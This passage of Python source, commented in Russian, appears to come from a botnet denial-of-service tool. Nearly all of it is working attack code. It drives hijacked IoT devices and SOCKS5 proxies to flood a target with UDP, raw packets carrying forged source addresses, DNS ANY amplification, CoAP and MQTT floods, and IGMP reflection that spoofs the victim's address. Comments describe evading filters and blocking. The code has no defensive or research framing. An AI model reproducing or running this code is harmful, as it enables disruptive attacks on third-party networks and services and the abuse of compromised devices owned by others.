            socket_count = 3  # Оптимально для большинства IoT
            
            for i in range(socket_count):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.5)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024)  # 64KB буфер
                    sockets.append(sock)
                except Exception as e:
                    print(f"⚠️ IoT {device.ip} не может создать сокет {i}: {e}")
                    continue
            
            if not sockets:
                print(f"❌ IoT {device.ip} не может создать сокеты")
                return 0, 0
            
            # ОПТИМАЛЬНЫЕ РАЗМЕРЫ ПАКЕТОВ ДЛЯ IoT
            packet_sizes = [512, 256, 1024, 128, 768]  # Разные размеры для обхода фильтров
            
            # ПРЕДГЕНЕРАЦИЯ ПАКЕТОВ (оптимизировано для IoT памяти)
            packet_pool = []
            pool_size = 20  # Меньше для экономии памяти
            
            for i in range(pool_size):
                size = random.choice(packet_sizes)
                # Создаем разнообразные пакеты
                if i % 4 == 0:
                    data = os.urandom(size)  # Случайные данные
                elif i % 4 == 1:
                    data = b'\x00' * size  # Нулевые данные
                elif i % 4 == 2:
                    data = b'\xFF' * size  # Единичные данные
                else:
                    data = b'X' * size  # Текстовые данные
                
                packet_pool.append(data)
            
            start_time = time.time()
            packet_counter = 0
            
            print(f"🚀 IoT {device.ip} начинает отправку...")
            
            while attack_stats['is_running'] and (time.time() - start_time) < (duration if duration > 0 else 3600):
                try:
                    # ЦИКЛИЧЕСКАЯ ОТПРАВКА ЧЕРЕЗ ВСЕ СОКЕТЫ
                    for sock_idx, sock in enumerate(sockets):
                        if not attack_stats['is_running']:
                            break
                            
                        try:
                            # Выбираем пакет из пула
                            data = packet_pool[packet_counter % len(packet_pool)]
                            
                            # Отправка пакета
                            sock.sendto(data, (target_ip, target_port))
                            
                            packets_sent += 1
                            bytes_sent += len(data)
                            packet_counter += 1
                            
                            # ОБНОВЛЕНИЕ СТАТИСТИКИ
                            with attack_stats['lock']:
                                attack_stats['total_packets'] += 1
                                attack_stats['total_bytes'] += len(data)
                            
                            # АДАПТИВНАЯ ПАУЗА ДЛЯ IoT
                            if packets_sent % 50 == 0:
                                time.sleep(0.005)  # 5ms пауза каждые 50 пакетов
                                
                        except socket.error as e:
                            failed_packets += 1
                            with attack_stats['lock']:
                                attack_stats['failed_packets'] += 1
                            # Пытаемся пересоздать сокет
                            try:
                                new_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                new_sock.settimeout(0.5)
                                sockets[sock_idx] = new_sock
                            except:
                                pass
                            continue
                    
                except Exception as e:
                    failed_packets += 1
                    with attack_stats['lock']:
                        attack_stats['failed_packets'] += 1
                    continue
            
            # Закрываем сокеты
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            mb_sent = bytes_sent / 1024 / 1024
            attack_duration = time.time() - start_time
            pps = packets_sent / attack_duration if attack_duration > 0 else 0
            
            print(f"✅ IoT {device.ip}: {packets_sent} пакетов ({mb_sent:.2f} МБ) | {pps:.0f} pps | Ошибок: {failed_packets}")
            return packets_sent, bytes_sent
            
        except Exception as e:
            print(f"❌ Ошибка в optimized_basic_udp для {device.ip}: {e}")
            return 0, 0

    def _raw_udp_attack(self, device, target_ip, target_port, duration, attack_stats):
        """RAW UDP атака для мощных IoT устройств"""
        
        packets_sent = 0
        bytes_sent = 0
        
        try:
            print(f"💥 Мощное IoT {device.ip} - RAW UDP атака...")
            
            # RAW socket требует прав root
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            start_time = time.time()
            
            while attack_stats['is_running'] and (time.time() - start_time) < duration:
                try:
                    # Генерация кастомных IP/UDP пакетов
                    raw_packet = self._create_raw_udp_packet(target_ip, target_port)
                    sock.sendto(raw_packet, (target_ip, 0))
                    
                    packets_sent += 1
                    bytes_sent += len(raw_packet)
                    
                    with attack_stats['lock']:
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += len(raw_packet)
                        
                except Exception as e:
                    with attack_stats['lock']:
                        attack_stats['failed_packets'] += 1
                    continue
            
            sock.close()
            return packets_sent, bytes_sent
            
        except Exception as e:
            print(f"❌ RAW UDP ошибка для {device.ip}: {e}")
            return 0, 0

    def _iot_amplification_attack(self, device, target_ip, target_port, duration, attack_stats):
        """Amplification атака для IoT с открытыми сервисами"""
        
        packets_sent = 0
        bytes_sent = 0
        
        try:
            print(f"🎯 IoT {device.ip} - amplification атака...")
            
            # Используем открытые сервисы устройства для amplification
            # Упрощенная реализация - на практике нужно определить конкретный сервис
            
            start_time = time.time()
            
            while attack_stats['is_running'] and (time.time() - start_time) < duration:
                try:
                    # DNS amplification пример
                    dns_query = self._create_dns_amplification_query(target_ip)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(dns_query, (device.ip, 53))  # Отправляем на DNS сервер устройства
                    sock.close()
                    
                    packets_sent += 1
                    bytes_sent += len(dns_query)
                    
                    with attack_stats['lock']:
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += len(dns_query)
                        
                    time.sleep(0.01)  # Amplification требует осторожности
                    
                except Exception:
                    with attack_stats['lock']:
                        attack_stats['failed_packets'] += 1
                    continue
            
            return packets_sent, bytes_sent
            
        except Exception as e:
            print(f"❌ Amplification ошибка для {device.ip}: {e}")
            return 0, 0

    # ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ

    def _check_port_open(self, host, port, timeout=1):
        """Проверяет открыт ли порт"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    def _scan_common_ports(self, host):
        """Сканирует common порты IoT устройств"""
        common_ports = [23, 53, 80, 443, 554, 1023, 1883, 1900, 37215, 52869, 5683]
        open_ports = []
        
        for port in common_ports:
            if self._check_port_open(host, port, 0.5):
                open_ports.append(port)
        
        return open_ports

    def _estimate_bandwidth(self, host):
        """Реальная оценка пропускной способности IoT устройства"""
        try:
            print(f"📊 Тестируем пропускную способность {host}...")
            
            test_sizes = [1024, 4096, 8192]  # Разные размеры пакетов для теста
            total_bytes = 0
            start_time = time.time()
            successful_tests = 0
            
            # Тестируем на порту 80 (HTTP) - обычно открыт
            for size in test_sizes:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    
                    # Пытаемся подключиться
                    sock.connect((host, 80))
                    
                    # Отправляем тестовые данные
                    test_data = os.urandom(size)
                    sock.send(test_data)
                    
                    # Читаем ответ (если есть)
                    sock.recv(1)  # Ждем хотя бы 1 байт
                    
                    total_bytes += size
                    successful_tests += 1
                    sock.close()
                    
                except (socket.timeout, socket.error, ConnectionRefusedError):
                    continue
                except Exception:
                    continue
            
            # Рассчитываем скорость в Мбит/с
            if successful_tests > 0:
                total_time = time.time() - start_time
                if total_time > 0:
                    speed_bps = (total_bytes * 8) / total_time
                    speed_mbps = speed_bps / 1000000
                    
                    # Классифицируем скорость
                    if speed_mbps > 50:
                        bandwidth = 100  # Быстрые устройства
                    elif speed_mbps > 10:
                        bandwidth = 50   # Средние устройства
                    elif speed_mbps > 5:
                        bandwidth = 10   # Медленные устройства
                    elif speed_mbps > 1:
                        bandwidth = 5    # Очень медленные
                    else:
                        bandwidth = 1    # Ограниченные
                        
                    print(f"📊 {host} - оценка скорости: {speed_mbps:.1f} Мбит/с -> класс {bandwidth}")
                    return bandwidth
            
            # Если тест не удался, определяем по портам
            return self._estimate_bandwidth_by_ports(host)
            
        except Exception as e:
            print(f"⚠️ Ошибка теста скорости {host}: {e}")
            return self._estimate_bandwidth_by_ports(host)

    def _estimate_bandwidth_by_ports(self, host):
        """Оценка пропускной способности по открытым портам"""
        open_ports = self._scan_common_ports(host)
        
        # Эвристика: определенные порты указывают на тип устройства
        high_bandwidth_ports = [443, 8080, 8443, 554]  # HTTPS, RTSP - обычно мощные устройства
        medium_bandwidth_ports = [80, 21, 22, 23]       # HTTP, FTP, SSH, Telnet
        low_bandwidth_ports = [161, 162, 5683, 1883]    # SNMP, CoAP, MQTT - IoT протоколы
        
        for port in open_ports:
            if port in high_bandwidth_ports:
                return random.choice([50, 100])
            elif port in medium_bandwidth_ports:
                return random.choice([10, 20])
            elif port in low_bandwidth_ports:
                return random.choice([1, 2, 5])
        
        return 1  # По умолчанию минимальная скорость

    def _create_raw_udp_packet(self, target_ip, target_port, source_ip=None, source_port=None):
        """Создает полный RAW UDP/IP пакет"""
        
        # Генерируем случайные source IP и порт если не указаны
        if not source_ip:
            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not source_port:
            source_port = random.randint(1024, 65535)
        
        # Данные пакета
        payload = os.urandom(random.randint(512, 1024))
        
        # Создаем UDP заголовок
        udp_header = self._create_udp_header(source_port, target_port, payload)
        
        # Создаем IP заголовок
        ip_header = self._create_ip_header(source_ip, target_ip, udp_header + payload)
        
        return ip_header + udp_header + payload

    def _create_udp_header(self, source_port, dest_port, data):
        """Создает UDP заголовок"""
        udp_length = 8 + len(data)
        
        # Проверка контрольной суммы (может быть 0)
        checksum = 0
        
        # UDP заголовок: Source Port, Dest Port, Length, Checksum
        udp_header = struct.pack('!HHHH', 
                               source_port,    # Source Port
                               dest_port,      # Destination Port  
                               udp_length,     # Length
                               checksum)       # Checksum
        
        return udp_header

    def _create_ip_header(self, source_ip, dest_ip, data):
        """Создает IP заголовок"""
        version = 4
        ihl = 5  # Internet Header Length (5 * 32 bits = 20 bytes)
        version_ihl = (version << 4) + ihl
        
        tos = 0      # Type of Service
        total_length = 20 + len(data)  # IP header + data
        
        identification = random.randint(0, 65535)
        flags_fragment = 0x4000  # Don't fragment
        
        ttl = 64
        protocol = socket.IPPROTO_UDP
        
        # Контрольная сумма IP заголовка (сначала 0)
        header_checksum = 0
        
        # Преобразуем IP адреса в бинарный формат
        source_ip_bin = socket.inet_aton(source_ip)
        dest_ip_bin = socket.inet_aton(dest_ip)
        
        # Собираем IP заголовок
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl,     # Version + IHL
                              tos,             # Type of Service
                              total_length,    # Total Length
                              identification,  # Identification
                              flags_fragment,  # Flags + Fragment Offset
                              ttl,             # Time to Live
                              protocol,        # Protocol
                              header_checksum, # Header Checksum
                              source_ip_bin,   # Source IP
                              dest_ip_bin)     # Destination IP
        
        # Рассчитываем контрольную сумму
        checksum = self._calculate_checksumudp(ip_header)
        
        # Пересобираем заголовок с правильной контрольной суммой
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl,
                              tos,
                              total_length,
                              identification,
                              flags_fragment,
                              ttl,
                              protocol,
                              checksum,
                              source_ip_bin,
                              dest_ip_bin)
        
        return ip_header

    def _calculate_checksumudp(self, data):
        """Рассчитывает контрольную сумму для IP/UDP заголовков"""
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
            checksum = (checksum & 0xffff) + (checksum >> 16)
        
        return ~checksum & 0xffff

    def _create_dns_amplification_query(self, target_ip):
        """Создает DNS ANY запрос для amplification атаки"""
        
        # DNS заголовок
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query
        questions = 1    # One question
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        dns_header = struct.pack('!HHHHHH', 
                               transaction_id,
                               flags,
                               questions,
                               answer_rrs, 
                               authority_rrs,
                               additional_rrs)
        
        # DNS вопрос: ANY запрос для домена (большой ответ)
        # Используем случайный поддомен для обхода кэширования
        random_subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
        domain = f"{random_subdomain}.example.com"
        
        # Кодируем домен в DNS формат
        qname_parts = []
        for part in domain.split('.'):
            qname_parts.append(len(part).to_bytes(1, 'big'))
            qname_parts.append(part.encode())
        qname_parts.append(b'\x00')  # Конец домена
        
        qname = b''.join(qname_parts)
        
        # QTYPE = ANY (255), QCLASS = IN (1)
        qtype = 255    # ANY запрос
        qclass = 1     # IN class
        
        dns_question = qname + struct.pack('!HH', qtype, qclass)
        
        return dns_header + dns_question

    def _create_socks5_connection(self, device):
        """Реализация установки SOCKS5 соединения"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Подключаемся к SOCKS5 прокси
            sock.connect((device.ip, device.port))
            
            # SOCKS5 handshake
            # Клиент приветствие: версия, методы аутентификации
            auth_methods = b'\x05\x01\x00'  # VER, NMETHODS, METHOD (0 = no auth)
            sock.send(auth_methods)
            
            # Ответ сервера
            server_auth = sock.recv(2)
            if len(server_auth) != 2 or server_auth[0] != 0x05 or server_auth[1] != 0x00:
                sock.close()
                return False, None
            
            return True, sock
            
        except Exception as e:
            print(f"❌ Ошибка SOCKS5 подключения к {device.ip}:{device.port}: {e}")
            return False, None

    def _send_udp_via_socks5(self, sock, data, target_ip, target_port):
        """Отправка UDP данных через SOCKS5 прокси"""
        try:
            # SOCKS5 UDP ASSOCIATE запрос
            ver = b'\x05'          # SOCKS version
            cmd = b'\x03'          # UDP ASSOCIATE command
            rsv = b'\x00'          # Reserved
            atype = b'\x01'        # IPv4 address type
            
            # Для UDP ASSOCIATE обычно используют 0.0.0.0:0
            dst_addr = socket.inet_aton('0.0.0.0')
            dst_port = struct.pack('!H', 0)
            
            associate_request = ver + cmd + rsv + atype + dst_addr + dst_port
            sock.send(associate_request)
            
            # Читаем ответ
            response = sock.recv(256)
            if len(response) < 10:
                return False
            
            # Парсим ответ: VER, REP, RSV, ATYPE, BND.ADDR, BND.PORT
            if response[0] != 0x05 or response[1] != 0x00:
                return False
            
            # Извлекаем bound address и port
            bound_port = struct.unpack('!H', response[8:10])[0]
            
            # Создаем UDP датаграмму для SOCKS5
            frag = b'\x00'         # Fragment number
            atype_dst = b'\x01'    # IPv4 address type
            
            # Целевой адрес и порт
            dst_addr_target = socket.inet_aton(target_ip)
            dst_port_target = struct.pack('!H', target_port)
            
            # Собираем SOCKS5 UDP датаграмму
            socks5_header = frag + atype_dst + dst_addr_target + dst_port_target
            socks5_packet = socks5_header + data
            
            # Отправляем через TCP SOCKS5 соединение
            # В реальности это должно идти через UDP сокет к bound адресу
            # Но для упрощения отправляем через TCP
            sock.send(socks5_packet)
            
            return True
            
        except Exception as e:
            print(f"❌ Ошибка отправки UDP через SOCKS5: {e}")
            return False

    def _protocol_specific_attack(self, device, target_ip, target_port, duration, attack_stats):
        """Атака с использованием специфичных IoT протоколов"""
        
        packets_sent = 0
        bytes_sent = 0
        
        try:
            device_type = self._detect_iot_capabilities(device.ip)['device_type']
            print(f"🔧 Запуск протокольной атаки для {device_type} {device.ip}")
            
            start_time = time.time()
            
            if device_type == 'coap_device':
                # CoAP (Constrained Application Protocol) атака
                return self._coap_protocol_attack(device, target_ip, target_port, duration, attack_stats)
            elif device_type == 'mqtt_device':
                # MQTT (Message Queuing Telemetry Transport) атака
                return self._mqtt_protocol_attack(device, target_ip, target_port, duration, attack_stats)
            elif device_type == 'telnet_device':
                # Telnet атака
                return self._telnet_protocol_attack(device, target_ip, target_port, duration, attack_stats)
            else:
                # Общая протокольная атака
                return self._generic_protocol_attack(device, target_ip, target_port, duration, attack_stats)
                
        except Exception as e:
            print(f"❌ Ошибка протокольной атаки для {device.ip}: {e}")
            return 0, 0

    def _coap_protocol_attack(self, device, target_ip, target_port, duration, attack_stats):
        """CoAP protocol flood attack"""
        packets_sent = 0
        bytes_sent = 0
        
        try:
            # CoAP обычно на порту 5683
            coap_port = target_port if target_port else 5683
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            start_time = time.time()
            
            while attack_stats['is_running'] and (time.time() - start_time) < duration:
                try:
                    # CoAP заголовок: Ver=1, T=CON, Code=0.01 (GET), Message ID
                    coap_header = struct.pack('!BBH', 
                                            0x40,  # Ver=1, T=CON (0)
                                            0x01,  # Code=0.01 (GET)
                                            random.randint(1, 65535))  # Message ID
                    
                    # Token (опционально)
                    token_length = random.randint(0, 8)
                    token = os.urandom(token_length)
                    
                    # Uri-Path options
                    paths = ['', 'well-known', 'core', 'sensors', 'temperature', 'humidity']
                    path = random.choice(paths)
                    
                    if path:
                        path_option = struct.pack('!B', (12 << 4) | len(path)) + path.encode()
                    else:
                        path_option = b''
                    
                    # Payload marker и данные
                    payload_marker = b'\xFF' if random.random() > 0.5 else b''
                    payload = os.urandom(random.randint(10, 100))
                    
                    coap_packet = coap_header + token + path_option + payload_marker + payload
                    
                    sock.sendto(coap_packet, (target_ip, coap_port))
                    
                    packets_sent += 1
                    bytes_sent += len(coap_packet)
                    
                    with attack_stats['lock']:
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += len(coap_packet)
                    
                    time.sleep(0.01)  # CoAP устройства обычно медленные
                    
                except Exception:
                    with attack_stats['lock']:
                        attack_stats['failed_packets'] += 1
                    continue
            
            sock.close()
            return packets_sent, bytes_sent
            
        except Exception as e:
            print(f"❌ CoAP атака ошибка: {e}")
            return 0, 0

    def _mqtt_protocol_attack(self, device, target_ip, target_port, duration, attack_stats):
        """MQTT protocol flood attack"""
        packets_sent = 0
        bytes_sent = 0
        
        try:
            # MQTT обычно на порту 1883
            mqtt_port = target_port if target_port else 1883
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, mqtt_port))
            
            start_time = time.time()
            
            # MQTT CONNECT packet
            client_id = f"attacker_{random.randint(1000, 9999)}"
            
            while attack_stats['is_running'] and (time.time() - start_time) < duration:
                try:
                    # Случайный выбор MQTT пакетов
                    packet_type = random.choice(['CONNECT', 'PUBLISH', 'SUBSCRIBE', 'PING'])
                    
                    if packet_type == 'CONNECT':
                        mqtt_packet = self._create_mqtt_connect(client_id)
                    elif packet_type == 'PUBLISH':
                        mqtt_packet = self._create_mqtt_publish()
                    elif packet_type == 'SUBSCRIBE':
                        mqtt_packet = self._create_mqtt_subscribe()
                    else:  # PING
                        mqtt_packet = b'\xC0\x00'  # PINGREQ
                    
                    sock.send(mqtt_packet)
                    
                    packets_sent += 1
                    bytes_sent += len(mqtt_packet)
                    
                    with attack_stats['lock']:
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += len(mqtt_packet)
                    
                    time.sleep(0.05)  # MQTT требует больших интервалов
                    
                except Exception:
                    with attack_stats['lock']:
                        attack_stats['failed_packets'] += 1
                    # Пытаемся переподключиться
                    try:
                        sock.close()
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((target_ip, mqtt_port))
                    except:
                        break
            
            sock.close()
            return packets_sent, bytes_sent
            
        except Exception as e:
            print(f"❌ MQTT атака ошибка: {e}")
            return 0, 0

    def _create_mqtt_connect(self, client_id):
        """Создает MQTT CONNECT пакет"""
        # Fixed header
        fixed_header = b'\x10'  # CONNECT packet type
        
        # Variable header
        protocol_name = b'\x00\x04MQTT'
        protocol_level = b'\x04'  # MQTT 3.1.1
        connect_flags = b'\x02'   # Clean session
        keep_alive = b'\x00\x3C' # 60 seconds
        
        # Payload
        client_id_bytes = client_id.encode()
        client_id_length = struct.pack('!H', len(client_id_bytes))
        
        variable_header = protocol_name + protocol_level + connect_flags + keep_alive
        payload = client_id_length + client_id_bytes
        
        # Remaining length
        remaining_length = len(variable_header) + len(payload)
        if remaining_length <= 127:
            fixed_header += struct.pack('!B', remaining_length)
        else:
            # Для больших пакетов нужна extended length encoding
            fixed_header += struct.pack('!B', 0x80 | (remaining_length // 128))
            fixed_header += struct.pack('!B', remaining_length % 128)
        
        return fixed_header + variable_header + payload

    def _create_mqtt_publish(self):
        """Создает MQTT PUBLISH пакет"""
        topic = f"sensors/{random.randint(1, 100)}/temperature"
        payload = str(random.randint(0, 100)).encode()
        
        topic_length = struct.pack('!H', len(topic))
        packet_id = struct.pack('!H', random.randint(1, 65535))
        
        variable_header = topic_length + topic.encode() + packet_id
        remaining_length = len(variable_header) + len(payload)
        
        fixed_header = b'\x30'  # PUBLISH packet type
        if remaining_length <= 127:
            fixed_header += struct.pack('!B', remaining_length)
        else:
            fixed_header += struct.pack('!B', 0x80 | (remaining_length // 128))
            fixed_header += struct.pack('!B', remaining_length % 128)
        
        return fixed_header + variable_header + payload

    def _create_mqtt_subscribe(self):
        """Создает MQTT SUBSCRIBE пакет"""
        topic = f"sensors/+/temperature"
        
        packet_id = struct.pack('!H', random.randint(1, 65535))
        topic_length = struct.pack('!H', len(topic))
        qos = b'\x00'  # QoS 0
        
        variable_header = packet_id
        payload = topic_length + topic.encode() + qos
        
        remaining_length = len(variable_header) + len(payload)
        
        fixed_header = b'\x82'  # SUBSCRIBE packet type
        if remaining_length <= 127:
            fixed_header += struct.pack('!B', remaining_length)
        else:
            fixed_header += struct.pack('!B', 0x80 | (remaining_length // 128))
            fixed_header += struct.pack('!B', remaining_length % 128)
        
        return fixed_header + variable_header + payload

    def _socks5_udp_attack(self, device, target_ip, target_port, duration, attack_stats):
        """UDP атака через SOCKS5 прокси"""
        
        packets_sent = 0
        bytes_sent = 0
        failed_packets = 0
        
        try:
            print(f"🔌 SOCKS5 {device.ip} - UDP атака...")
            
            # Создаем SOCKS5 соединения
            socks_pool = []
            for i in range(2):  # 2 соединения на SOCKS5 прокси
                try:
                    success, sock_obj = self._create_socks5_connection(device)
                    if success:
                        socks_pool.append(sock_obj)
                except:
                    continue
            
            if not socks_pool:
                print(f"❌ SOCKS5 {device.ip} не может установить соединения")
                return 0, 0
            
            start_time = time.time()
            packet_index = 0
            
            # Пул пакетов для SOCKS5
            packet_pool = []
            for i in range(20):
                size = random.randint(128, 1024)
                packet_pool.append(os.urandom(size))
            
            while attack_stats['is_running'] and (time.time() - start_time) < duration:
                try:
                    # Отправка через SOCKS5 (упрощенная реализация)
                    current_sock = socks_pool[packet_index % len(socks_pool)]
                    data = packet_pool[packet_index % len(packet_pool)]
                    
                    # Здесь должна быть реализация UDP через SOCKS5 ASSOCIATE
                    success = self._send_udp_via_socks5(current_sock, data, target_ip, target_port)
                    
                    if success:
                        packets_sent += 1
                        bytes_sent += len(data)
                        
                        with attack_stats['lock']:
                            attack_stats['total_packets'] += 1
                            attack_stats['total_bytes'] += len(data)
                    else:
                        failed_packets += 1
                        with attack_stats['lock']:
                            attack_stats['failed_packets'] += 1
                    
                    packet_index += 1
                    time.sleep(0.05)  # SOCKS5 медленнее
                    
                except Exception as e:
                    failed_packets += 1
                    with attack_stats['lock']:
                        attack_stats['failed_packets'] += 1
                    continue
            
            # Закрытие SOCKS5 соединений
            for sock in socks_pool:
                try:
                    sock.close()
                except:
                    pass
            
            print(f"✅ SOCKS5 {device.ip}: {packets_sent} пакетов")
            return packets_sent, bytes_sent
            
        except Exception as e:
            print(f"❌ SOCKS5 ошибка для {device.ip}: {e}")
            return 0, 0

    def igmp_reflection_attack(self, target_ip, duration=60):
        """IGMP Reflection атака - использование IGMP запросов для amplification"""
        print(f"🎯 Запуск IGMP Reflection атаки на {target_ip}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_packets': 0,
            'total_bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def _create_igmp_membership_query(self):
            """Создает IGMP Membership Query пакет для reflection"""
            # IGMP Version 2 Membership Query
            igmp_type = 0x11  # Membership Query
            igmp_max_resp_time = 0x64  # 100 * 1/10 second
            igmp_checksum = 0
            igmp_group_address = socket.inet_aton("0.0.0.0")  # General Query
            
            # Создаем IGMP заголовок
            igmp_header = struct.pack('!BBH4s', 
                                    igmp_type, igmp_max_resp_time, igmp_checksum, igmp_group_address)
            
            # Вычисляем checksum
            igmp_checksum = self._calculate_checksum(igmp_header)
            igmp_header = struct.pack('!BBH4s', 
                                    igmp_type, igmp_max_resp_time, igmp_checksum, igmp_group_address)
            
            return igmp_header

        def _create_igmp_report_v2(self, group_address):
            """Создает IGMP Version 2 Membership Report"""
            igmp_type = 0x16  # Version 2 Membership Report
            igmp_max_resp_time = 0
            igmp_checksum = 0
            igmp_group = socket.inet_aton(group_address)
            
            igmp_header = struct.pack('!BBH4s', igmp_type, igmp_max_resp_time, igmp_checksum, igmp_group)
            igmp_checksum = self._calculate_checksum(igmp_header)
            igmp_header = struct.pack('!BBH4s', igmp_type, igmp_max_resp_time, igmp_checksum, igmp_group)
            
            return igmp_header

        def _create_igmp_report_v3(self):
            """Создает IGMP Version 3 Membership Report"""
            # Более сложный V3 report с несколькими group records
            igmp_type = 0x22  # Version 3 Membership Report
            igmp_reserved = 0
            igmp_checksum = 0
            igmp_reserved2 = 0
            igmp_number_of_group_records = random.randint(1, 5)
            
            # Базовый заголовок
            igmp_header = struct.pack('!BBHH', igmp_type, igmp_reserved, igmp_checksum, igmp_number_of_group_records)
            
            # Добавляем group records
            group_records = b''
            for i in range(igmp_number_of_group_records):
                record_type = random.choice([1, 2, 3, 4])  # MODE_IS_INCLUDE, etc.
                aux_data_len = 0
                number_of_sources = random.randint(0, 3)
                multicast_address = socket.inet_aton(f"224.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}")
                
                record_header = struct.pack('!BBH', record_type, aux_data_len, number_of_sources)
                sources = b''
                for j in range(number_of_sources):
                    source_ip = socket.inet_aton(f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}")
                    sources += source_ip
                
                group_records += record_header + multicast_address + sources
            
            full_packet = igmp_header + group_records
            igmp_checksum = self._calculate_checksum(full_packet)
            igmp_header = struct.pack('!BBHH', igmp_type, igmp_reserved, igmp_checksum, igmp_number_of_group_records)
            
            return igmp_header + group_records

        def igmp_attack_single(device):
            packets_sent = 0
            bytes_sent = 0
            estimated_amplified_bytes = 0
            failed_packets = 0
            
            try:
                print(f"🎯 {device.ip} начинает IGMP Reflection атаку...")
                start_time = time.time()
                
                # Создаем raw socket для IP spoofing
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                except PermissionError:
                    print(f"❌ {device.ip}: Требуются права root для IP spoofing!")
                    return 0, 0
                
                # Список multicast групп для атаки
                multicast_groups = [
                    "224.0.0.1",    # All hosts
                    "224.0.0.2",    # All routers
                    "224.0.0.22",   # IGMP
                    "239.255.255.250",  # SSDP
                    "224.0.1.129",  # PTP
                ]
                
                # Генерируем дополнительные multicast группы
                for i in range(20):
                    multicast_groups.append(f"224.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 254)}")
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный тип IGMP атаки
                        attack_type = random.choice(['membership_query', 'v2_report', 'v3_report'])
                        
                        if attack_type == 'membership_query':
                            # IGMP Membership Query reflection
                            igmp_packet = self._create_igmp_membership_query()
                            dest_ip = random.choice(multicast_groups)
                            
                        elif attack_type == 'v2_report':
                            # IGMPv2 Membership Report
                            group = random.choice(multicast_groups)
                            igmp_packet = self._create_igmp_report_v2(group)
                            dest_ip = group
                            
                        else:  # v3_report
                            # IGMPv3 Membership Report (самый большой)
                            igmp_packet = self._create_igmp_report_v3()
                            dest_ip = random.choice(multicast_groups)
                        
                        # Создаем полный IP пакет с spoofed source IP
                        source_ip = target_ip  # IP жертвы как источник
                        ip_packet = self._create_ip_header_simple(
                            source_ip=source_ip,
                            dest_ip=dest_ip,
                            data_length=len(igmp_packet),
                            protocol=socket.IPPROTO_IGMP
                        )
                        
                        full_packet = ip_packet + igmp_packet
                        sock.sendto(full_packet, (dest_ip, 0))
                        
                        # Оценка amplification factor для IGMP
                        request_size = len(full_packet)
                        amplification_factor = random.randint(5, 20)  # IGMP имеет умеренный коэффициент
                        estimated_response_size = request_size * amplification_factor
                        
                        packets_sent += 1
                        bytes_sent += request_size
                        estimated_amplified_bytes += estimated_response_size
                        
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes_sent'] += request_size
                        attack_stats['estimated_amplified_bytes'] += estimated_response_size
                        
                        # Задержка для избежания блокировки
                        time.sleep(random.uniform(0.05, 0.2))
                        
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                mb_amplified = estimated_amplified_bytes / 1024 / 1024
                
                print(f"✅ {device.ip} отправил {packets_sent} IGMP пакетов")
                print(f"   📤 Отправлено: {mb_sent:.2f} МБ")
                print(f"   💥 Оценка усиленного трафика: {mb_amplified:.2f} МБ")
                
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, igmp_attack_single, "IGMP Reflection")

    def icmp_black_hole(self, target_ip, duration=60):
        """ПОЛНОСТЬЮ РАБОЧАЯ комплексная сетевая атака"""
        print("🕳️ ЗАПУСК РЕАЛЬНОЙ КОМПЛЕКСНОЙ СЕТЕВОЙ АТАКИ")
        
        # Проверка raw socket доступа
        if not self.raw_socket_available:
            print("❌ Требуются права root для комплексной атаки!")
            return None
        
        # Используем только IoT устройства с raw socket доступом
